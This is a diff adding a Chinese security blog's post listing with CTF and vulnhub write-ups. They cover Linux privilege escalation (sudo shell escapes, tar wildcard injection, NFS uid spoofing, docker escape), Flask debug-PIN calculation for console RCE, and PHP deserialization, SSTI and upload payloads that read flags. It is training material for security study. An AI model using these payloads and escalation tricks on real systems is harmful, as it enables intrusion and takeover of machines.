+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/php/" style="color: #00bcd4">php</a>
+        </span>
+        
+    </div>
+    <a href="/2023/03/27/NKCTF2023%20web%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/03/20/Lin.Security%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/">
+        <h2 class="post-title">Lin.Security靶机学习</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/20
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><strong>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a></strong></p>
+<h1 id="靶机网络配置"><a href="#靶机网络配置" class="headerlink" title="靶机网络配置"></a>靶机网络配置</h1><p>先用用户名bob 密码secret登录<br>然后提权到root</p>
+<pre><code class="bash">sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
+</code></pre>
+<p>注意由于环境的配置 双引号是shift+2</p>
+<p>提权完毕后</p>
+<pre><code class="bash">vim /etc/default/keyboard
+</code></pre>
+<p>将XKBLAYOUT改为us</p>
+<pre><code class="bash">vim /etc/netplan/50-cloud-init.yaml
+</code></pre>
+<p>将enp0s3改为ens33</p>
+<p>然后<br><code>setupcon</code>   再  <code>netplan apply</code></p>
+<h1 id="环境扫描"><a href="#环境扫描" class="headerlink" title="环境扫描"></a>环境扫描</h1><p>去看看lin.security靶机的网卡地址<br><img src="https://img-blog.csdnimg.cn/80c5708e0e49454bae75ce336dcd8039.png" alt="在这里插入图片描述"></p>
+<p>nmap扫描得到<br><img src="https://img-blog.csdnimg.cn/e0776c7f8424471c8532a68d82e663fa.png" alt="在这里插入图片描述"></p>
+<p>由用户名bob密码secret低权限ssh登录<br><img src="https://img-blog.csdnimg.cn/a3e0c2bb68104fc5a71eb28d2c2112e4.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法1"><a href="#提权方法1" class="headerlink" title="提权方法1"></a>提权方法1</h1><p>读取<code>/etc/passwd</code></p>
+<p><img src="https://img-blog.csdnimg.cn/a04e17a337ad407484059cfe4a847637.png" alt="在这里插入图片描述"><br>发现insecurity用户的gid和uid都是0 且显示了密码的哈希<br>在线查询得到密码为P@ssw0rd!<br>ssh尝试登录<br>登录成功<br><img src="https://img-blog.csdnimg.cn/90c56a6cbd2045a89b44641bcd3d5a66.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h1><p>sudo提权,以下方法都是基于sudo的滥用<br><img src="https://img-blog.csdnimg.cn/f6c216eaa9c744a39eca06d402c12ec4.png" alt="在这里插入图片描述"><br>发现我们拥有sudo权限的命令有awk find等<br>尝试用find命令提权</p>
+<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><pre><code class="bash">sudo find /etc/passwd -exec &quot;/bin/bash&quot; \;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/09c3b4971b14461eaf3658b6f0571a3c.png" alt="在这里插入图片描述"></p>
+<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><img src="https://img-blog.csdnimg.cn/92971299873d4065b621c2e273abc699.png" alt="在这里插入图片描述"><br>输入<code>!/bin/bash</code><br><img src="https://img-blog.csdnimg.cn/7801cb85d7654161ac31b68b4ce1cfba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f002478c123a4f55939e9fdcc3906417.png" alt="在这里插入图片描述"></p>
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>sudo awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’<br><img src="https://img-blog.csdnimg.cn/646208979f0046a4a1a3d6c873b0b46a.png" alt="在这里插入图片描述"></p>
+<h2 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h2><p><img src="https://img-blog.csdnimg.cn/58dd032bc7c64c86b1ab75434d8daa46.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e4a6bfeae0444aa8bef18c3491044912.png" alt="在这里插入图片描述"></p>
+<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><pre><code class="bash">sudo socat stdin exec:/bin/bash
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b034c4335f6a40fdade227b55d178def.png" alt="在这里插入图片描述"><br>还有一些基于sudo滥用的提权 在此不一一列举<br>可以去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>找相关提权方法</p>
+<h1 id="提权方法3"><a href="#提权方法3" class="headerlink" title="提权方法3"></a>提权方法3</h1><p>定时任务提权<br>先查看<code>/etc/crontab</code>有哪些定时任务<br><img src="https://img-blog.csdnimg.cn/e0a77705d8614bdf98110e4c83908ff8.png" alt="在这里插入图片描述"><br>从左到右以此为分,时,日,月,周<br>如此处最后一条代表每一分钟执行一次 <code>/etc/cron.daily/backup</code><br>看名字是备份,我们去查看一下<br><img src="https://img-blog.csdnimg.cn/382ed542460f4dea843df2a26b80bb4d.png" alt="在这里插入图片描述"><br>此处的含义是每一分钟以root权限执行一次backup中的命令<br>注意到使用了tar命令对&#x2F;home下每个目录进行备份,且使用了通配符<code>*</code>我们可以考虑创建如下两个文件</p>
+<pre><code class="bash">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &gt; &quot;--checkpoint=1&quot;
+</code></pre>
+<p>因为当匹配到这两个文件的文件名的时候会当做同名参数使用<br>用msf生成shell.sh的内容<br><img src="https://img-blog.csdnimg.cn/67cea76f66ce431b908c2ed1b971a933.png" alt="在这里插入图片描述"><br>这里打马的是我的vps<br>写入后在vps上nc监听,然后等一会<br><img src="https://img-blog.csdnimg.cn/2763405d1f0d4940aae3caa12fed0277.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法4"><a href="#提权方法4" class="headerlink" title="提权方法4"></a>提权方法4</h1><p>suid提权</p>
+<pre><code class="bash">find / -perm -u=s -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/null
+</code></pre>
+<p>找可用命令</p>
+<p><img src="https://img-blog.csdnimg.cn/8569cbd9f8e24fc29aad7e40ceb81cb2.png" alt="在这里插入图片描述"><br>发现有taskset<br><img src="https://img-blog.csdnimg.cn/5a3fce08eb3c4a59b786f6bdec02a911.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法5"><a href="#提权方法5" class="headerlink" title="提权方法5"></a>提权方法5</h1><p>nfs提权<br>之前nmap扫到了2049端口存在nfs服务<br>攻击机<code>showmount</code><br><img src="https://img-blog.csdnimg.cn/da37dd76651d4c9cbecf5d561d19261a.png" alt="在这里插入图片描述"><br>挂载该目录到<code>/tmp/nfs</code></p>
+<pre><code class="bash">mkdir /tmp/nfs
+sudo mount -t nfs 192.168.45.132:/home/peter /tmp/nfs
+</code></pre>
+<p>挂载完后进行访问<br><img src="https://img-blog.csdnimg.cn/33fd937db6b04d6b8fdad5a72747d4b9.png" alt="在这里插入图片描述"><br>说明挂载成功了,但是不能写入文件<br><img src="https://img-blog.csdnimg.cn/dc3763d501f54792969bf8b6cf6b10e0.png" alt="在这里插入图片描述"><br>而该目录的所属组是1005,所有者是www<br>我们可以创建一个用户,所属组1005,所有者www来欺骗nfs<br>这里所有者的uid应该是1001,因为我kali上创建过1001的用户www所以显示的www<br><img src="https://img-blog.csdnimg.cn/1a9e2bfbff4544c38318b5b0a9bb654a.png" alt="在这里插入图片描述"><br>所以我们只需要改变www用户的gid<br><img src="https://img-blog.csdnimg.cn/d5c6e16ddc1e47a8b131545a46d4dfda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d35ab7e2d604435c90e46eb8430de24c.png" alt="在这里插入图片描述"><br>修改成功,尝试用www用户进行访问<img src="https://img-blog.csdnimg.cn/24feb002110b437abcd39cd11bbc53ca.png" alt="在这里插入图片描述"><br>成功写入,可以写了之后我们尝试写入ssh公钥<br>攻击机先用命令生成<br><code>ssh_keygen</code></p>
+<p><img src="https://img-blog.csdnimg.cn/79f96eb18c0d4e36b4f5a907880b596d.png" alt="在这里插入图片描述"><br>然后复制一份公钥到<code>/tmp</code>目录下,并重命名为<code>authorized_keys</code><img src="https://img-blog.csdnimg.cn/be1d31fd926f47a6b1eaef937a4e78a2.png" alt="在这里插入图片描述"><br>然后www用户再复制到<code>/tmp/nfs/.ssh</code>目录下<br><img src="https://img-blog.csdnimg.cn/6ff0160f7ca6463aadefa35aa1903209.png" alt="在这里插入图片描述"><br>使用私钥ssh连接<br><img src="https://img-blog.csdnimg.cn/87dfe433bd474951809e96a79c963bff.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda0aa9cc6364f7399106cc19ac0d979.png" alt="在这里插入图片描述"><br>发现可以用strace提权</p>
+<p><img src="https://img-blog.csdnimg.cn/62dc9926f5204e688a43c2a4c96a2f88.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法6"><a href="#提权方法6" class="headerlink" title="提权方法6"></a>提权方法6</h1><p>docker提权<br><img src="https://img-blog.csdnimg.cn/9ee8d6ab8e0b4ce1a495a6e824f2e570.png" alt="在这里插入图片描述"><br>发现peter也属于docker组</p>
+<pre><code class="bash">docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e9a86bfd727448978f232d8633639744.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #03a9f4">服务器</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #00a596">学习</a>
+        </span>
+        
+    </div>
+    <a href="/2023/03/20/Lin.Security%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/02/20/%E5%85%B3%E4%BA%8Ectf%E4%B8%ADflask%E7%AE%97pin%E6%80%BB%E7%BB%93/">
+        <h2 class="post-title">关于ctf中flask算pin总结</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/20
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="什么是pin码"><a href="#什么是pin码" class="headerlink" title="什么是pin码"></a>什么是pin码</h1><p>pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell</p>
+<h1 id="pin码如何生成"><a href="#pin码如何生成" class="headerlink" title="pin码如何生成"></a>pin码如何生成</h1><p>pin码生成要六要素<br>1.username 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测<br>2.modname 默认<code>flask.app</code><br>3.appname 默认<code>Flask</code><br>4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量<br>5.uuidnode mac地址的十进制,任意文件读 <code>/sys/class/net/eth0/address</code><br>6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了</p>
+<p>在python3.8以后生成的脚本如下</p>
+<pre><code class="python">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;app&#39;,
+    &#39;flask.app&#39;,
+    &#39;Flask&#39;,
+    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39; 
+]
+
+private_bits = [
+    &#39;2485376911915&#39;,
+    &#39;7265fe765262551a676151a24c02b7b646a18828428b87e35c5482255b121e8f7464b02e50ffe3f1d626f8c05793f49a&#39;# get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id
+]   
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&quot;utf-8&quot;)
+    h.update(bit)
+h.update(b&quot;cookiesalt&quot;)
+
+cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;
+
+# If we need to generate a pin we salt it a bit more so that we don&#39;t
+# end up with the same value and generate out 9 digits
+num = None
+if num is None:
+    h.update(b&quot;pinsalt&quot;)
+    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]
+
+# Format the pincode in groups of digits for easier remembering if
+# we don&#39;t have a result yet.
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &quot;-&quot;.join(
+                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
+                for x in range(0, len(num), group_size)
+            )
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+<h1 id="关于machine-id"><a href="#关于machine-id" class="headerlink" title="关于machine-id"></a>关于machine-id</h1><p>如果能任意文件读尝试去读取<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code><br>上面的python版本可以通过报错拿到<br>去找里面的get_machine-id方法<br><img src="https://img-blog.csdnimg.cn/623b41985de64bc3aa0fd8de989bfd9c.png" alt="在这里插入图片描述"><br>可以知道<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_id</code>只要读取到其中一个就break的<br>然后继续拼接上<code>/proc/self/cgroup</code>下的用正则匹配到的值<br>其实肉眼也能看出来<br>那么很明了了<br>machine-id是又两个值拼接的<br>下面直接上例题</p>
+<h1 id="CTFSHOW801"><a href="#CTFSHOW801" class="headerlink" title="CTFSHOW801"></a>CTFSHOW801</h1><p><img src="https://img-blog.csdnimg.cn/7db57bdc7ee84df998da584d6f6abfd2.png" alt="在这里插入图片描述"></p>
+<pre><code class="python">probably_public_bits = [
+    &#39;root&#39;,#读/etc/passwd
+    &#39;flask.app&#39;,#默认
+    &#39;Flask&#39;,#默认
+    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39; #报错得到
+]
+</code></pre>
+<p>然后读网卡<br><img src="https://img-blog.csdnimg.cn/ad83121fe4774df981427a8aeef8492e.png" alt="在这里插入图片描述"><br>转十进制<br><img src="https://img-blog.csdnimg.cn/0fd023d47e8d46b39a3afdc3e5b8c29e.png" alt="在这里插入图片描述"><br>machine-id<br><code>/etc/machine-id</code>读不到,那么就是<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>拼接了<br>得到machine-id<br>此处cgroup下读的是docker&#x2F;后面的那串字符串<br><img src="https://img-blog.csdnimg.cn/510e1444667b4f409c1c7db287215de3.png" alt="在这里插入图片描述"><br>计算pin码得到548-952-682<br>然后报错或访问&#x2F;consloe进控制台rce<br><img src="https://img-blog.csdnimg.cn/c0331f0f98fe4b9b8f0fca34b62a3649.png" alt="在这里插入图片描述"></p>
+<h1 id="过滤相关"><a href="#过滤相关" class="headerlink" title="过滤相关"></a>过滤相关</h1><p>本题中没有过滤,那么当过滤了<code>self</code>的时候怎么办呢<br>也就是<code>/proc/self/cgroup</code>没法用了<br>其中的<code>self</code>可以用相关进程的pid去替换,其实<code>1</code>就行<br><img src="https://img-blog.csdnimg.cn/964ea3ea44454fb6910c93aee791e2b4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cea67fade92b4077bf234cf5bd1343b7.png" alt="在这里插入图片描述"><br>那么<code>cgroup</code>过滤了呢?<br>可以考虑<code>mountinfo</code>或者<code>cpuset</code><br><img src="https://img-blog.csdnimg.cn/c2d03b3331aa496797b1392b1e957842.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bbd86e42e2d74a4fba69561aaa66e579.png" alt="在这里插入图片描述"></p>
+<p>接下里再看几题吧</p>
+<h1 id="HSCSEC-2TH-EZFLASK"><a href="#HSCSEC-2TH-EZFLASK" class="headerlink" title="HSCSEC-2TH EZFLASK"></a>HSCSEC-2TH EZFLASK</h1><p>拿用户<br><img src="https://img-blog.csdnimg.cn/dd68d2ad56884c8d85b60fff8b40450a.png" alt="在这里插入图片描述"></p>
+<p>拿版本<br><img src="https://img-blog.csdnimg.cn/7e0225575b9041adb809607c779cdb1e.png" alt="在这里插入图片描述"><br>本题能读到<code>/etc/machine-id</code><br>拼接得到<br><img src="https://img-blog.csdnimg.cn/0e69232f67334d168d3507daf05938e5.png" alt="在这里插入图片描述"></p>
+<p>生成pin码进console</p>
+<p><img src="https://img-blog.csdnimg.cn/8bf2123b0a16443da7fa2a8f00683e1e.png" alt="在这里插入图片描述"><br>读不了flag,用环境下的readflag读</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/flask/" style="color: #00a596">flask</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00bcd4">后端</a>
+        </span>
+        
+    </div>
+    <a href="/2023/02/20/%E5%85%B3%E4%BA%8Ectf%E4%B8%ADflask%E7%AE%97pin%E6%80%BB%E7%BB%93/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/01/19/2023SICTF%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">2023SICTF部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/1/19
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><strong>兔年大吉</strong><br>首先找到利用点<br>在Happy类中有一个<br>Call_user_func()函数<br>1.	当访问不存在方法时调用__call,于是在Nevv类中发现check()方法, <img src="https://img-blog.csdnimg.cn/55b6aa2ef90f43748d3fd88026ad26a5.png" alt="在这里插入图片描述">所有类都没有该方法<br>2.	当将类作为函数调用的时候执行__invoke,于是<img src="https://img-blog.csdnimg.cn/f96cf980ba074db3bbf9f70895d03e8f.png" alt="在这里插入图片描述"><br>3.	访问不存在的方法的时候执行__get,于是</p>
+<p><img src="https://img-blog.csdnimg.cn/1ae64799bf8940eb80cead60d10afc8e.png" alt="在这里插入图片描述"><br>那么为什么不是Year类中的firecrackers()方法呢?在该方法中进行的是赋值,会调用__set而不是__get</p>
+<ol start="4">
+<li>   上面说了,对无法访问的属性进行赋值会调用__set,所以<img src="https://img-blog.csdnimg.cn/0bcc6b99a1e648dca99d62200e5a867b.png" alt="在这里插入图片描述"><br>5.<img src="https://img-blog.csdnimg.cn/408f50d853d74ea290b1496c9a61aa10.png" alt="在这里插入图片描述"><br>于是构造代码如下</li>
+</ol>
+<pre><code class="php">&lt;?php
+class Happy&#123;
+    private $cmd=&quot;system&quot;;
+    private $content=&quot;tac /flag&quot;;
+&#125;
+class Nevv&#123;
+    private $happiness;
+    public function __construct($happiness)&#123;
+        $this-&gt;happiness = $happiness;
+    &#125;
+&#125;
+class Rabbit&#123;
+    private $aspiration;
+    public function __construct($aspiration)&#123;
+        $this-&gt;aspiration = $aspiration;
+    &#125;
+    public function __set($name,$val)&#123;
+        return @$this-&gt;aspiration-&gt;family;//3
+    &#125;
+&#125;
+class Year&#123;
+    public $key=&quot;happy new year&quot;;
+    public $rabbit;
+&#125;
+$pop = new Year();
+$Y = new Year();
+$Y-&gt;rabbit = new Nevv(new Happy());
+$R = new Rabbit($Y);
+$pop-&gt;rabbit = $R;
+$R-&gt;aspiration = 1;
+echo urlencode((serialize($pop)));
+</code></pre>
+<p>exp:<code>O%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A6%3A%22Rabbit%22%3A1%3A%7Bs%3A18%3A%22%00Rabbit%00aspiration%22%3BO%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A4%3A%22Nevv%22%3A1%3A%7Bs%3A15%3A%22%00Nevv%00happiness%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A10%3A%22%00Happy%00cmd%22%3Bs%3A6%3A%22system%22%3Bs%3A14%3A%22%00Happy%00content%22%3Bs%3A9%3A%22tac+%2Fflag%22%3B%7D%7D%7D%7D%7D</code><br><strong>ezbypass</strong><br><img src="https://img-blog.csdnimg.cn/21f25214a74f472482c9c7d9db6fe547.png" alt="在这里插入图片描述"></p>
+<p>可用的字符为<br>  ! $ ‘ ( ) + , . &#x2F; ; &#x3D; [ ] _<br>  最终exp<br>  <code>$%DF=(_/_._)[&#39;!&#39;==&#39;_&#39;];$_=%2B%2B$%DF;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE[__]($$%DE[_]);&amp;__=system&amp;_=cat /flag</code></p>
+<p>含义</p>
+<pre><code class="php">$%DF=(_/_._)[‘!’==’_’];//NAN
+$_=++$%DF;//O
+$%DE=_;//_
+$%DE.=++$_.$%DF;//_P
+$_++;//Q
+$_++;//R
+$%DE.=++$_;//_POS
+$%DE.=++$_;//_POST
+$$%DE[__]($$%DE[_]);//$_POST[__]($_POST[_])
+</code></pre>
+<p>用hackbar打不上去,建议用bp打,也可能是我操作的问题<br><strong>ezupload</strong><br><img src="https://img-blog.csdnimg.cn/b25266f815474be391d1cf89594dc7a0.png" alt="在这里插入图片描述">黑名单中没有php,有pHp但是没用,因为在判断的时候会先转小写<br>所以小马可以直接传上去<br>我们传上去的文件会被重命名移动到upload’.’&#x2F;‘.date(“His”).rand(114,514).$file_ext<br>本地生成date<br><img src="https://img-blog.csdnimg.cn/dd567149c9554b5a9798ad19ef0d4a52.png" alt="在这里插入图片描述"><br>然后由于我们不知道上传的时候date是什么,所以干脆bp多传几个,然后在这个时间段内随便找一个date去打<br><img src="https://img-blog.csdnimg.cn/efed1a62407346358d248d5db594915e.png" alt="在这里插入图片描述"><br>在上传的过程中本地生成一个date值,然后bp跑114到514<br><img src="https://img-blog.csdnimg.cn/81e5acd06e6c4f73994d1fbf78d4d7ad.png" alt="在这里插入图片描述"><br>访问该路径<br><img src="https://img-blog.csdnimg.cn/49c63f54aeca4a4a985eae311fdbe8d9.png" alt="在这里插入图片描述"></p>
+<p><strong>SSTI</strong><br>F12说GET提交SI<br>过滤了很多关键字,最终exp<br><code>&#123;%print( lipsum['__glo'+'bals__'].os['po'+'pen']('tac /ga1f').read() )%&#125;</code><br><strong>ezphp</strong><br>未修复<img src="https://img-blog.csdnimg.cn/2c3d912d531c44eea4fea11e7c38aea2.png" alt="在这里插入图片描述"><br>未修复的时候顺便读了下db.php<img src="https://img-blog.csdnimg.cn/7a42484d3b84422dbc862c22b2d5d677.png" alt="在这里插入图片描述"><br>结果修复之后密码没改<br>admin<br>0909876qwe222<br>直接登录<br>然后admin.php界面post提交url&#x3D;index.php<img src="https://img-blog.csdnimg.cn/45c5d7ee903941959830a6f9a31cb02e.png" alt="在这里插入图片描述"><br>再提交x9ad.php</p>
+<p><img src="https://img-blog.csdnimg.cn/e5178e90c63b42e39e7957cfa8c36270.png" alt="在这里插入图片描述"><br>发现是反序列化<br><img src="https://img-blog.csdnimg.cn/d78c148637de4f779961f38c7c285f59.png" alt="在这里插入图片描述"></p>
+<p>exp:<code>TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoyMDoic3lzdGVtKCd0YWMgL2ZsYWcnKTsiO30</code></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p><strong>签到打卡完成</strong><br>传不了图<br>向公众号发SICTF,得到flag<br><strong>Color</strong><br>Stegsolve打开图片,random color map 多换几个,能出个可以扫的码<br>扫码得到flag</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><p><strong>Ascii</strong><br>异或3之后base32 base64<br><strong>babyRsa</strong><br>由代码可得n是由多个小的素数得到的,factor分解<br>然后工具一把梭<br><img src="https://img-blog.csdnimg.cn/5548451d2ce74039b252f1d25914d893.png" alt="在这里插入图片描述"><br><strong>Polyrsa</strong><br>pq为多项式,计算k<br><img src="https://img-blog.csdnimg.cn/9814d0a2011344eea7e585c66de196a6.png" alt="在这里插入图片描述"><br>然后算出pq工具一把梭<img src="https://img-blog.csdnimg.cn/310269f3992248cea416c6175b1811f8.png" alt="在这里插入图片描述"></p>
+<p>sage代码如下</p>
+<pre><code class="python">n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291
+PR.&lt;k&gt; = PolynomialRing(ZZ)
+p = 18*k**5 + 9*k**4 - 20*k**3 - 144*k + 47527
+q = k**6 + 22*k**3 - 149*k**2 - 14*k + 39293
+n0 = p * q
+f = n - n0
+sol = f.roots()
+print(sol)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/01/19/2023SICTF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/01/19/SICTF%E5%89%A9%E4%BD%99crypto%E5%A4%8D%E7%8E%B0/">
+        <h2 class="post-title">SICTF剩余crypto复现</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/1/19
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>@<a href="crypto">TOC</a></p>
+<h1 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h1><pre><code class="bash">from Crypto.Util.number import *
+import gmpy2
+import libnum
+import flag
+def gen_num(x):
+    while True:
+        x+=1
+        if isPrime(x):
+            break
+    return x
+
+p = getPrime(512)
+q = gen_num(p*8)
+r = gen_num(q*16)
+s = gen_num(r*32)
+n = p**8 * q**16 * r**32 * s**2
+
+e = getPrime(2048)
+c = pow(libnum.s2n(flag), e, n)
+
+print(&#39;n =&#39;, n)
+print(&#39;c =&#39;, c)
+print(&#39;e =&#39;, e)
+n = 51059854037897000746834632298987919078047535683270918952887469573053146812374709131883096644013861573642089139215809753373104115016269066247148361976517187505377652654692368654516208817232643428036954588708009869166161888849845121612257770346265614784547626080298993627592746814361845701487512454077338047294248903776117930356165018954529019042178631853307390942473551788460896772591912820035853511382975345360129761278292183130572199885823141737416774615420656147500302280173210217067416004386657923409694575325530960458466382327399039219785827302936166918507204942259713257913678402782296838790721636615099943841449833289067456492080038200558289149104936597873379735641551843534349582103931422838876935663863709957299881206235577484895944612570146295065580633200276453595128244986214006257441803121378853409650198520028461586524897480752560489314729861140225229615982850026609828290960721839595780535766792365340982827580440646618533349148607392038429855733293970161148865527881228265214351383510467400976747992724105266240357896718267333829696757350328774777840157926712689893772497122691683686223841292320915579238253420489605054882402865823764025196436696172799917864661390793461665573790232956842068280875054657178637402361425513511048241962749115750241786456383254381208302675367368766485491087768633376664369403156451672298366919970478829165675727191509139997718966332905420299714697863199146792338811998947394157247616299090196001196889227267682777125600865645029618388449125175211142453144919811829217979849044049322365395010291588940111625159188590979086907301877467424684616453691063301590296491190718708524324003254093884196134583551736813004250138232792628901738398190872973412919330204915579343698851051770176573360556913564320844795266235277848213771323959289699710236623027915345645523251930153422234090167113823953984524015187861036339068345966347195462386865932430407758761108418834112130391887649204357888305973861521043943936833846063157425541782262781552360192353762657667700408501787586092880276217647781528484093695114217653276851772863656225624066840952518488614280180282545146544099345702277107795709422895759212231968221629450933826273987216348297250899170252528936110597157465912612729623324790550549652568381771136670474661702774488941390468486757708166713718762382534941022938948419960873986422103598527768130738993984840579029447387862209220083775316110169553994751461472769995220011454436205187393850559146924046537909137783729756132329739351815252451394829447577077487259660134552646959048603738676796481263161822452723385081890934600744975677970731960991512761882855191068142